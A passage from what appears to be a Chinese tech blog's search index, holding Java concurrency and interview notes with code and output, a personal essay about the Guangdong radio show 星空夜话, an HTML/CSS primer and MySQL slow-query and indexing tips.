*/public class AtomicStampedReferenceDemo { public static AtomicStampedReference&lt;Integer&gt; atomicStampedReference = new AtomicStampedReference&lt;Integer&gt;(100, 1); public static void main(String[] args) { new Thread(() -&gt; { int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() + "初始版本号: " + stamp); try { // 暂定一秒t1线程，保证下面的t2线程拿到的初始版本号与t1的初始版本号一致 TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } atomicStampedReference.compareAndSet(100, 101, atomicStampedReference.getStamp(), atomicStampedReference.getStamp() + 1); System.out.println(Thread.currentThread().getName() + "第一次修改后的版本号: " + atomicStampedReference.getStamp()); atomicStampedReference.compareAndSet(101, 100, atomicStampedReference.getStamp(), atomicStampedReference.getStamp() + 1); System.out.println(Thread.currentThread().getName() + "第二次修改后的版本号: " + atomicStampedReference.getStamp()); }, "t1").start(); new Thread(() -&gt; { int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() + "初始版本号: " + stamp); try { // 暂定两秒t2线程，保证上面的t1线程完成了一次ABA操作 TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); } boolean result = atomicStampedReference.compareAndSet(100, 102, stamp, stamp + 1); System.out.println(Thread.currentThread().getName() + "是否修改成功：" + result + "，当前实际最新的版本号为： " + atomicStampedReference.getStamp()); System.out.println("当前实际最新值为：" + atomicStampedReference.getReference()); }, "t2").start(); }} 123456t1初始版本号: 1t2初始版本号: 1t1第一次修改后的版本号: 2t1第二次修改后的版本号: 3t2是否修改成功：false，当前实际最新的版本号为： 3当前实际最新值为：100 ABA 问题解决总结原子引用 + 版本号（类似时间戳）机制，可以直接使用 JDK 提供的版本号原子引用类 AtomicStampedReference 来解决 ABA 问题。 Java 锁公平锁和非公平锁公平锁和非公平锁介绍 JUC 包中的公平锁和非公平锁用的都是 ReentrantLock 公平锁：是指多个线程按照申请锁的顺序来获取锁，类似排队打饭，先到先得 非公平锁：是指多个线程获取锁的顺序并不是按照申请锁的顺序，有可能后申请的线程比先申请的线程优先获取锁。在高并发的情况下，有可能会造成优先级反转或者饥饿现象 公平锁和非公平锁的区别 公平锁：公平锁就是很公平，在并发情况下，每个线程在获取锁时会查看此锁维护的等待队列，如果为空，或者当前线程是等待队列的第一个，就占有锁，否则就会加入到等待队列中，以后会按照 FIFO 的规则从队列中取到自己 非公平锁：非公平锁比较粗鲁，上来就直接尝试占有锁，如果尝试失败，就再采取类似公平锁那种方式（等待队列）处理 JUC 包中 ReentrantLock 的创建可以指定构造函数的 boolean 类型来得到公平锁或非公平锁，默认是非公平锁。非公平锁的优点在于吞吐量比公平锁大。对于 Synchronized 而言，也是一种非公平锁。 可重入锁（递归锁）可重入锁（递归锁）介绍 可重入锁（递归锁）指的是同一个线程外层函数获得锁之后，内层递归函数仍然能获取该锁的代码，在同一线程在外层方法获取锁的时候，在进入内层方法会自动获取锁（代码如下）。也就是说，线程可以进入任何一个它已经拥有的锁所有同步着的代码块。ReentrantLock、Synchronized 都是典型的可重入锁（递归锁）。可重入锁最大的作用是可以避免死锁。 12345678910public class LockTest { public synchronized void method1() { method2(); } public synchronized void method2() { }} 验证 ReentrantLock 是可重入锁的代码 ★展开代码★ 123456789101112131415161718192021222324252627282930313233343536373839import java.util.concurrent.locks.ReentrantLock;/** * 可重入锁（递归锁） ReentrantLock 验证代码 */public class LockTest { private static ReentrantLock lock = new ReentrantLock(); public static void get() { lock.lock(); try { System.out.println(Thread.currentThread().getName() + "\\t invoked get()"); set(); } finally { lock.unlock(); } } public static void set() { lock.lock(); try { System.out.println(Thread.currentThread().getName() + "\\t invoked set()"); } finally { lock.unlock(); } } public static void main(String[] args) { new Thread(() -&gt; { get(); }, "t1").start(); new Thread(() -&gt; { get(); }, "t2").start(); }} 1234t1 invoked get()t1 invoked set()t2 invoked get()t2 invoked set() 自旋锁（SpinLock）自旋锁介绍 自旋锁是指尝试获取锁的线程不会立即阻塞，而是采用循环的方式去尝试获取锁，这样的好处是减少线程上下切换的消耗，缺点是循环获取锁的操作会消耗 CPU 资源。在 CAS 中 Unsafe 类使用自旋锁的代码如下图： 验证自旋锁的代码 ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import java.util.concurrent.atomic.AtomicReference;/** * 自旋锁验证代码 */public class LockTest { private AtomicReference&lt;Thread&gt; atomicReference = new AtomicReference&lt;Thread&gt;(); public void lock() { System.out.println(Thread.currentThread().getName() + "\\t come in"); Thread thread = Thread.currentThread(); // 自旋锁实现 while (!atomicReference.compareAndSet(null, thread)) { // do something } System.out.println(Thread.currentThread().getName() + "\\t lock"); } public void unlock() { System.out.println(Thread.currentThread().getName() + "\\t unlock"); Thread thread = Thread.currentThread(); // 释放自旋锁 atomicReference.compareAndSet(thread, null); } public static void sleep(long mills) { try { Thread.sleep(mills); } catch (InterruptedException e) { e.printStackTrace(); } } public static void main(String[] args) { LockTest4 test = new LockTest4(); new Thread(() -&gt; { test.lock(); sleep(5000); test.unlock(); }, "t1").start(); sleep(1000); new Thread(() -&gt; { test.lock(); test.unlock(); }, "t2").start(); }} 123456t1 come int1 lockt2 come int1 unlockt2 lockt2 unlock 独占锁（写锁）与共享锁（读锁）独占锁（写锁）与共享锁（读锁）介绍 独占锁（写锁）：指该锁一次只能被一个线程所持有，对于 ReentrantLock 和 Synchronized 而言都是独占锁（写锁） 共享锁（读锁）：指该锁可被多个线程所持有，对于 ReentrantReadWriteLock，其读锁是共享锁，其写锁是独占锁。读锁（共享锁）可保证并发读是非常高效的，其中读写、写读、写写的过程是互斥的，而读读是可以共存的 验证独占锁（写锁）与共享锁（读锁）的代码 ★展开代码★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import java.util.HashMap;import java.util.Map;import java.util.concurrent.TimeUnit;import java.util.concurrent.locks.ReentrantReadWriteLock;/* * 验证读写锁，简单模拟MyBatis的缓存实现 * 多个线程同时读同一个资源没有问题，所以为了满足并发量，读取共享资源应该可以同时进行，但是写共享资源只能有一个线程 * 写操作：原子+独占，整个过程必须是一个完整的统一体，中间不许被分割，被打断 */class MyCache { private volatile Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); private ReentrantReadWriteLock reentrantReadWriteLock = new ReentrantReadWriteLock(); public void put(String key, Object value) { reentrantReadWriteLock.writeLock().lock(); try { System.out.println(Thread.currentThread().getName() + "\\t 正在写入：" + key); try { TimeUnit.MILLISECONDS.sleep(300); } catch (InterruptedException e) { e.printStackTrace(); } map.put(key, value); System.out.println(Thread.currentThread().getName() + "\\t 写入完成"); } catch (Exception e) { e.printStackTrace(); } finally { reentrantReadWriteLock.writeLock().unlock(); } } public void get(String key) { reentrantReadWriteLock.readLock().lock(); try { System.out.println(Thread.currentThread().getName() + "\\t 正在读取：" + key); try { TimeUnit.MILLISECONDS.sleep(300); } catch (InterruptedException e) { e.printStackTrace(); } Object result = map.get(key); System.out.println(Thread.currentThread().getName() + "\\t 读取完成" + result); } catch (Exception e) { e.printStackTrace(); } finally { reentrantReadWriteLock.readLock().unlock(); } }}public class ReadWriteLockDemo { public static void main(String[] args) { MyCache myCache = new MyCache(); for (int i = 1; i &lt;= 5; i++) { final int tempInt = i; new Thread(() -&gt; { myCache.put(tempInt + "", tempInt + ""); }, String.valueOf(i)).start(); } for (int i = 1; i &lt;= 5; i++) { final int tempInt = i; new Thread(() -&gt; { myCache.get(tempInt + ""); }, String.valueOf(i)).start(); } }} 12345678910111213141516171819202 正在写入：22 写入完成1 正在写入：11 写入完成5 正在写入：55 写入完成1 正在读取：14 正在读取：41 读取完成14 读取完成null4 正在写入：44 写入完成3 正在写入：33 写入完成3 正在读取：35 正在读取：52 正在读取：23 读取完成35 读取完成52 读取完成2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"Java 基础面试题之一",url:"/posts/d6058b93.html",text:'Java 基础自增变量代码案例: 12345678910public class Test { public static void main(String[] args) { int a = 10; int varNum = 66; varNum = varNum++; System.out.println(varNum); } // 运行结果： 66} 知识点： 栈：局部变量的值，在内存分析的时候，都被放入了栈中，栈的特点是先进后出，意味着先放进去的数，会被放在下面，后进去的数，一个一个垒在上面（就像往直筒中放乒乓球） push 虚拟机指令：主要包括 bipush 和 sipush，它们的区别在于接收数据类型的不同，bipush 接收 8 位整数作为参数，sipush 接收 16 位整数，它们都将参数压入栈 istore_n 虚拟机指令：从操作数栈中弹出一个整数，并把它赋值给第 n 个局部变量 xload_n 虚拟机指令：表示将第 n 个局部变量压入操作数栈，比如 iload_1、fload_0、aload_0 等指令，其中 aload_n 表示将一个对象引用压栈 iinc 虚拟机指令：对给定的局部变量做自增操作，这条指令是少数几个执行过程中完全不修改操作数栈的指令；它接收两个操作数：第 1 个局部变量表的位置，第 2 个位累加数。比如常见的 i++ 就会产生这条指令 问题分析： 下面将使用 javap 工具来分析问题，javap 是 JDK 自带的反汇编器，可以查看 Java 编译器生成的字节码。通过它，可以对照源代码和字节码，从而更了解编译器内部的工作过程。执行以下命令： javac Test.java javap -c Test javap 反汇编后，会输出以下内容，其中 main() 里的 0 - 7 就是底层 varNum = varNum++ 的执行过程 12345678910111213141516171819202122Compiled from "Test.java"public class Test { public Test(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object."&lt;init&gt;":()V 4: return public static void main(java.lang.String[]); Code: 0: bipush 10 2: istore_1 3: bipush 66 5: istore_2 6: iload_2 7: iinc 2, 1 10: istore_2 11: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 14: iload_2 15: invokevirtual #3 // Method java/io/PrintStream.println:(I)V 18: return} 结合上面铺垫的虚拟机指令，这里讲解 main() 里的 0 -11 的工作流程： 0: bipush 10 将参数 10 压入操作数栈 2: istore_1 从操作数栈中弹出一个数，赋给第一个局部变量（a） 3: bipush 66 将参数 66 压入操作数栈 5: istore_2 从操作数栈中弹出一个数，赋给第二个局部变量（varNum） 6: iload_2 将第二个局部变量（varNum）的值入栈，此时操作数栈的栈顶值为 66 7: iinc 2, 1 对第二个局部变量（varNum）做自增 1 操作，意味着局部变量 varNum 的值变为 67；特别注意，这里并没有修改操作数栈里的任何内容 10: istore_2 从操作数栈的栈顶弹出一个数（即 66）赋给第二个局部变量（varNum），意味局部变量 varNum 的值又变回 66 了 11: iload_2 将第二个局部变量（varNum）的值入栈，此时操作数栈的栈顶值为 66 最终打印结果就是：66 Java Lang Spec 在文中也提到： 自增运算符 ++ 的优先级大于赋值运算符 = The result of the postfix increment expression is not a variable, but a value，翻译过来就是：后 ++ 符表达式的结果是个值而不是一个变量 进阶案例代码： 123456789101112public class Test { public static void main(String[] args) { int i = 1; i = i++; int j = i++; int k = i + ++i * i++; System.out.println("i=" + i); // 4 System.out.println("j=" + j); // 1 System.out.println("k=" + k); // 11 }} ★展开完整的 Java 字节码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758Compiled from "Test.java"public class Test { public Test(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object."&lt;init&gt;":()V 4: return public static void main(java.lang.String[]); Code: 0: iconst_1 1: istore_1 2: iload_1 3: iinc 1, 1 6: istore_1 7: iload_1 8: iinc 1, 1 11: istore_2 12: iload_1 13: iinc 1, 1 16: iload_1 17: iload_1 18: iinc 1, 1 21: imul 22: iadd 23: istore_3 24: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 27: new #3 // class java/lang/StringBuilder 30: dup 31: invokespecial #4 // Method java/lang/StringBuilder."&lt;init&gt;":()V 34: ldc #5 // String i= 36: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 39: iload_1 40: invokevirtual #7 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 43: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 46: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 49: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 52: new #3 // class java/lang/StringBuilder 55: dup 56: invokespecial #4 // Method java/lang/StringBuilder."&lt;init&gt;":()V 59: ldc #10 // String j= 61: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 64: iload_2 65: invokevirtual #7 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 68: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 71: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 74: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 77: new #3 // class java/lang/StringBuilder 80: dup 81: invokespecial #4 // Method java/lang/StringBuilder."&lt;init&gt;":()V 84: ldc #11 // String k= 86: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 89: iload_3 90: invokevirtual #7 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 93: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 96: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 99: return} 案例小结: 赋值 = 最后计算 = 右边的从左到右加载值依次压入操作数栈 实际先算哪个，看运算符的优先级 自增、自减操作都是直接修改变量的值，不经过操作数栈 在最后的赋值之前，临时结果都是存储在操作数栈中 方法参数传递知识点： 形参是基本数据类型时 传递数据值 实参是引用数据类型 传递地址值 特殊的类型：String、包装类（如 Integer）等对象拥有不可变性 代码案例： 12345678910111213141516171819202122232425262728293031323334353637public class Example { public static void main(String[] args) { int i = 1; String str = "hello"; Integer num = 200; int[] arr = { 1, 2, 3, 4, 5 }; MyData my = new MyData(); change(i, str, num, arr, my); System.out.println("i = " + i); System.out.println("str = " + str); System.out.println("num = " + num); System.out.println("arr = " + Arrays.toString(arr)); System.out.println("my.a = " + my.a); // 运行结果 // i = 1 // str = hello // num = 200 // arr = [2, 2, 3, 4, 5] // my.a = 11 } public static void change(int j, String s, Integer n, int[] a, MyData data) { j += 1; s += "world"; n += 1; a[0] += 1; data.a += 1; }}class MyData { int a = 10;} 分析过程： 点击截图查看分析过程 类与实例初始化类的初始化过程： 一个类要创建实例需要先加载并初始化该类（main 方法所在的类需要先加载和初始化） 一个子类要初始化需要先初始化父类 一个类初始化，本质就是执行 &lt;clinit&gt;() 方法 &lt;clinit&gt;() 方法由静态类变量赋值代码和静态代码块组成 静态类变量赋值代码和静态代码块代码从上到下顺序执行 &lt;clinit&gt;() 方法只会执行一次 实例的初始化过程： 实例初始化，本质就是执行 &lt;init&gt;() 方法： &lt;init&gt;() 方法可能重载有多个，有几个构造器就有几个 &lt;init&gt;() 方法 &lt;init&gt;() 方法由非静态实例变量赋值代码和非静态代码块、对应构造器代码组成 非静态实例变量赋值代码和非静态代码块代码从上到下顺序执行，而构造器的代码永远最后执行 每次创建实例对象，调用对应构造器，执行的就是对应的 &lt;init&gt;() 方法 &lt;init&gt; 方法的首行是 super() 或 super(实参列表)，即对应父类的 &lt;init&gt; 方法 重写（Override）与重载（Overload）的区别： 两者的区别： 重写（Override）也称覆盖，它是父类与子类之间多态性的一种表现，而重载（Overload）是一个类中多态性的一种表现 重写（Override 它是覆盖了父类的一个方法并且对其重写，以求达到不同作用 重载（Overload）它是指定义一些名称相同的方法，通过定义不同的输入参数来区分这些方法 重写（Override）的规则 参数列表必须与被重写方法的相同 非抽象子类中必须重写父类中的 abstract 方法 不能重写被标识为 final、private、static 的方法 访问修饰符的限制一定不能不小于被重写方法的访问修饰符 子类直接再写一个同名的方法，这并不是对父类方法进行重写（Override），而是重新生成一个新的方法 重写的方法不能抛出新的异常，或者超过了父类范围的异常，但是可以抛出更少、更有限的异常，或者不抛出异常 重载（Overload）的规则： 重载是针对于一个类而言的 不能重载只有返回值不同的方法 方法的异常类型和数目不会对重载造成影响 不能通过访问权限、返回类型、抛出的异常进行重载 与被重载的方法比较，参数的类型、个数、顺序至少有一个不相同 对象的多态性： 非静态方法默认的调用对象是 this this 对象在构造器或者说 &lt;init&gt;() 方法中就是正在创建的对象 子类如果重写了父类的方法，通过子类对象调用的一定是子类重写过的代码 问答互动： 为什么在实例化子类的对象时，会先调用父类的构造器？ 子类继承父类后，获取到父类的属性和方法，这些属性和方法在使用前必须先初始化，所以须先调用父类的构造器进行初始化 在哪里调用父类的构造器？ 父类的构造器是不能被继承的，但可以用 super() 调用 在子类构造器的第一行会隐式的调用 super()，即调用父类的构造器 如果父类中没有定义无参的构造器，则必须在子类的构造器的第一行显示的调用 super(参数) ，以此调用父类中构造器 代码案例： ★展开案例代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243public class Father { private int i = test(); private static int j = method(); static { System.out.print("(1)"); } public Father() { System.out.print("(2)"); } { System.out.print("(3)"); } public int test() { System.out.print("(4)"); return 1; } public static int method() { System.out.print("(5)"); return 1; } public static void main(String[] args) { Father f1 = new Father(); System.out.println(); Father f2 = new Father(); } // 运行结果： // (5)(1)(4)(3)(2) // (4)(3)(2) // 分析结果： // 静态类变量赋值代码和静态代码块代码从上到下顺序执行 (5)(1) // 非静态实例变量赋值代码和非静态代码块代码从上到下顺序执行 (4)(3) // 构造器的代码永远最后执行 (2) // 由于创建了两个 Father 对象，因此实例化方法 &lt;init&gt;() 执行了两次 (4)(3)(2)} 12345678910111213141516public class Son extends Father{ public Son() { } public static void main(String[] args){ Son test = new Son(); } // 运行结果： // (5)(1)(4)(3)(2) // 分析过程： // 实例化子类的对象时，默认会先通过 super() 调用父类的构造器方法，即先创建父类对象} 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class Son extends Father { private int i = test(); private static int j = method(); static { System.out.print("(6)"); } public Son() { System.out.print("(7)"); } { System.out.print("(8)"); } public int test() { System.out.print("(9)"); return 1; } public static int method() { System.out.print("(10)"); return 1; } public static void main(String[] args) { Son s1 = new Son(); System.out.println(); Son s2 = new Son(); } // 运行结果： // (5)(1)(10)(6)(9)(3)(2)(9)(8)(7) // (9)(3)(2)(9)(8)(7) // 分析过程： // 初始化父类和子类： // 1) 先初始化父类：(5)(1) // 2) 初始化子类：(10)(6) // 调用子类的实例化方法 &lt;init&gt;()： // 1) super()，期间调用了子类中被重写的 test() 方法 (9)(3)(2) // 2) i= test() (9) // 3) 子类的非静态代码 (8) // 4) 子类的无参构造方法 (7) // 由于创建了两个 Son 对象，因此实例化方法 &lt;init&gt;() 执行了两次 // (9)(3)(2)(9)(8)(7)} &lt;/code&gt; 局部变量与成员变量知识点： 就近原则 变量的分类 局部变量 成员变量，包括类变量、实例变量 局部变量与成员变量的区别 声明的地方 局部变量声明的地方：方法体 {} 中、形参、代码块 {} 中 成员变量声明的地方：类中方法外 类变量：有 static 修饰 实例变量：没有 static 修饰 修饰符的使用 局部变量：final 成员变量：public、protected、private、final、static、volatile、transient 值存储的位置 局部变量：栈 成员变量 类变量：方法区 实例变量：堆 作用域 局部变量：从声明处开始，到所属的 } 结束 成员变量 类变量：在当前类中 类名.，在其他类中 类名. 或者 对象名. 访问 实例变量：在当前类中 this.，在其他类中 对象名. 访问 声明周期 局部变量：每一个线程，每一次调用执行都是新的生命周期 成员变量 类变量：随着类的初始化而初始化，随着类的卸载而消亡，该类的所有对象的类变量是共享的 实例变量：随着对象的创建而初始化，随着对象的被回收而消亡，每一个对象的实例变量都是互相独立的 当局部变量与成员变量重名时，如何区分？ 局部变量与类变量重名：在类变量前加 类名. 局部变量与实例变量重名：在实例变量前加 this. 非静态代码块的执行：每次创建实例对象时都会执行 代码案例： 12345678910111213141516171819202122232425262728293031323334public class Example { static int s; int i; int j; { int i = 1; i++; j++; s++; } public void test(int j) { i++; j++; s++; } public static void main(String[] args) { Example obj1 = new Example(); Example obj2 = new Example(); obj1.test(10); obj1.test(20); obj2.test(30); System.out.println(obj1.i + ", " + obj1.j + ", " + obj1.s); System.out.println(obj2.i + ", " + obj2.j + ", " + obj2.s); // 运行结果： // 2, 1, 5 // 1, 1, 5 }} 点击截图查看分析过程 设计模式单例模式知识点： 单例的特点 一是某个类只能有一个实例，即构造器私有化 二是必须自行创建这个实例，即含有一个该类的静态变量来保存唯一的实例 三是必须自行向整个系统提供这个实例，对外提供获取实例对象的方式一般是：直接通过静态变量暴露或者使用静态 Get 方法来获取 单例模式常见的几种形式： 饿汉式（直接创建对象，不存在线程安全的问题） 直接实例化饿汉式（简洁直观） 枚举式（最简洁） 静态代码块饿汉式（适合复杂的实例化） 懒汉式（延迟创建对象） 线程不安全（适用于单线程） 线程安全（适用于多线程） 静态内部类形式（适用于多线程） 饿汉式代码案例： ★展开案例代码★ 1234567891011/** * 饿汉式 - 直接实例化饿汉式（简洁直观） */public class HungrySingleton { public static final HungrySingleton INSTANCE = new HungrySingleton(); private HungrySingleton() { }} 123456/** * 饿汉式 - 枚举式（最简洁） */public enum HungrySingleton { INSTANCE} 12345678910111213141516/** * 饿汉式 - 静态代码块饿汉式（适合复杂的实例化） */public class HungrySingleton { public static final HungrySingleton INSTANCE; static { // do anything INSTANCE = new HungrySingleton(); } private HungrySingleton() { }} &lt;/code&gt; 懒汉式代码案例： ★展开案例代码★ 123456789101112131415161718/** * 懒汉式 - 线程不安全（适用于单线程） */public class LazySingleton01 { private static LazySingleton01 instance; private LazySingleton01() { } public static LazySingleton01 getInstance() { if (instance == null) { instance = new LazySingleton01(); } return instance; }} 12345678910111213141516171819202122232425/** * 懒汉式 - DCL（双端检锁），适用于多线程 * 1) DCL（双端检锁）机制不一定是线程安全的，原因是有指令重排序的存在，加入volatile可以禁止指令重排 * 2) 原因在多线程环境下，某一个线程执行到第一个检测，读取到的instance不为null时，instance的引用对象可能没有完成初始化 * 3) 指令重排只会保证串行语义的执行一致性（单线程），但并不会关心多线程间的语义一致性。所以当一条线程访问instance不为null时，由于instance实例未必已初始化完成，也就造成了线程安全问题 */public class LazySingleton02 { private static volatile LazySingleton02 instance; private LazySingleton02() { } public static LazySingleton02 getInstance() { if (instance == null) { synchronized (LazySingleton02.class) { if (instance == null) { instance = new LazySingleton02(); } } } return instance; }} 12345678910111213141516171819/** * 懒汉式 - 静态内部类形式（适用于多线程） * 1）静态内部类不会自动随着外部类的加载和初始化而初始化，它是单独去加载和初始化的 * 2）因为是在静态内部类加载和初始化时，才创建单例对象，因此是线程安全的 */public class LazySingleton03 { private LazySingleton03() { } public static LazySingleton03 getInstance() { return Singleton.instance; } private static class Singleton { private static final LazySingleton03 instance = new LazySingleton03(); }} &lt;/code&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"电台 FM91.4 - 星空夜话",url:"/posts/7263da5.html",text:'最新公告 2021 年 2 月 电台节目《星空夜话》恢复播出，主持人是黄纬，电台收听频段依旧是 91.4（仅限广深佛），播出时段是 22:30 - 00:00（周一～周五）。 序言 偶然的情况下在豆瓣上看到了文章 - 我很想念《星空夜话》，跟作者一样也是《星空夜话》的忠实听众，于是有了以下的碎碎念。 节目历史 《星空夜话》是广东新闻广播推出的深夜情感电台节目，电台收听频段是 91.4（仅限广深佛），播出时段是 22:15 - 00:00（周一～周五）。这档节目最初的名称是《谈情谈到十二点》，而《谈情谈到十二点》的前身是午间版的《男生女生配》。最初的节目主持人是吕囡囡，后来节目改版了，吕囡囡和孙潇毅开始搭档主持节目，记忆犹新的是节目改版后，片头的那句 “我们总有故事发生”。忘了过了多久，孙潇毅后来离开了《星空夜话》，转去做音乐电台，然后就再也没在《星空夜话》里出现过了。后来男主播黄纬加入《星空夜话》，与吕囡囡轮流主持节目。可惜吕囡囡在 2015.03.21 主持完最后一期节目后也离开了《星空夜话》，转去做午间节目《微博大视野》，刚好那段时间吕囡囡结婚了（三个月闪婚），记得最后那期（2015.03.21）节目的主题是《以最骄傲的姿态离开》。最后，《星空夜话》就剩下黄纬在继续主持节目了。 在线收听 若希望在线收听《星空夜话》的历史节目或者最新节目，手机可以下载安装 APP 蜻蜓 FM，然后在 APP 内搜索 "星空夜话" 即可。如果喜欢主播黄纬的声音，还可以在 蜻蜓 FM 上收听节目 《随风潜入夜》，或者关注主播的微信公众号 fm0424。 星空记忆 记得第一次收听《星空夜话》是在读初二的时候，距今大概也有 15 年了；在那个少有 MP3、手机的学生时代，用的是便携式收音机收听。那时候比较懵懂，也不知道为什么后来就慢慢喜欢上了这档电台节目，尤其喜欢节目主持人吕囡囡的声音。初中到高中一直都在听，不过读大学和工作后收听的频率就低了很多，只是偶尔在失眠或者情绪低落的时候才会听一下。 博客说明 在 PC 端访问当前博客时，网页左下角的音乐播放器列表里会有《星空夜话》的节目，音频来源于 蜻蜓 FM，节目播出日期是从 2014.09.24 到 2017.03.29，每次刷新页面都会从 477 期的节目中随机抽取若干期节目，这算是对《星空夜话》的一种纪念。由于音频的版权原因，此功能暂时停用。 宣传图片 附上《星空夜话》的宣传图片 微信群 日后希望有机会建一个《星空夜话》的微信群，若听友感兴趣可以扫描下方的微信群二维码，加入到群里和小伙伴们一起分享自己的星空经历。由于微信群二维码存在有效期，若过期了你可以在下方的评论区留言，建议留言的时候在邮箱的输入框内填写你的邮箱地址，笔者会通过邮件联系你并邀请你加入星空夜话的微信群。因为在下方评论区留言后，评论区默认是不会显示你的邮箱地址，只有笔者能在后台看到，所以你不用担心个人隐私泄漏的问题。',tags:"生活随笔"},{title:"前端入门基础之 HTML 与 CSS",url:"/posts/838fe3ef.html",text:'Web 标准Web 标准是由 W3C（万维网联盟组织）组织制定，包括以下三部分： 结构: HTML 表现: CSS 行为: JavaScript 浏览器内核 IE: trident 内核 Firefox: 火狐 gecko 内核 Opear: webkit 内核 Safari: webkit 内核 Chrome: blink 内核，属于 webkit 内核的一个分支 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"前端"},{title:"MySQL 性能优化 - 第一篇",url:"/posts/b562d0a3.html",text:'查询各种 SQL 的执行频率语法：show [session|global] status like ‘% Com_%’; 查询示例： 12345678# 查询当前数据库执行CRUD操作的次数show global status like \'com_select\';show global status like \'com_insert\';show global status like \'com_update\';show global status like \'com_delete\';# 查看当前数据库的连接数show global status like \'connections\'; 慢查询优化启用记录慢查询日志注意：通过 MySQL 命令来修改慢查询相关参数，无论修改全局还是当前会话内的配置参数，在 MySQL 重启之后都会失效，想永久生效必须修改 MySQL 的配置文件。 1234567891011121314151617# 修改当前会话的慢查询定义时间set long_query_time = 1;# 或者修改全局默认的慢查询定义时间set global long_query_time = 1;# 查询是否开启了记录慢查询日志show variables like \'%slow%\';# 开启记录慢查询日志set global slow_query_log = on;# 查询慢查询发生的次数show status like \'slow_queries\';# 查询默认的慢查询定义时间show variables like \'long_query_time\'; 永久启用记录慢查询日志MySQL5.6 开启慢查询日志，需要在配置文件 my.cnf 中添加以下配置。 12345678# 慢查询时间long_query_time=1# 是否记录慢查询slow_query_log=TRUE# 慢查询日志文件的路径slow_query_log_file=/var/log/mysqld-slow.log 索引优化添加、删除索引索引的类型包括主键索引、唯一索引、普通索引、全文索引，比较特殊的是复合索引 (单个索引作用在多列上)，其中索引的添加、删除、使用率查询语法如下： 1234567891011121314151617181920212223242526# 查询某张表的索引信息show keys from table_xx;show index from table_xx;# 添加主键索引alter table table_xx add primary key(column_name);# 添加普通索引create index index_name on table_xx(column_name);alter table table_xx add index index_name(column_name);# 添加唯一索引，唯一索引所在的列值可以为Null，同时可以存在多个Null值create unique index index_name on table_xx(column_name);create table table_xx(id primary key auto_increment, name varchar(20) unique);# 全文索引只对MyIsam存储引擎有效，且只针对英文生效；Mysql中可以使用sphinx(coreseek)技术处理中文的全文索引，正确使用全文索引查询的语法如下，其中title、body字段存在全文索引select * from articles where match(title, body) against(\'tomcat\');# 删除索引(适用于唯一索引、普通索引、全文索引)alter table table_xx drop index index_name;# 删除主键索引alter table table_xx drop primary key;# 查看索引的使用率show status like \'Handler_read%\'; 索引的适用场景12345678910# 较频繁的作为查询条件字段应该创建索引select * from emp where empno = 1# 唯一性太差的字段不适合单独创建索引，即使是频繁作为查询条件select * from emp where sex = \'男\'# 更新非常频繁的字段不适合创建索引select * from emp where logincount = 1# 不会出现在WHERE子句中的字段不该创建索引 索引不生效的情况 对于多列索引，如果不是使用的第一部分，则不会使用索引 如果 MySQL 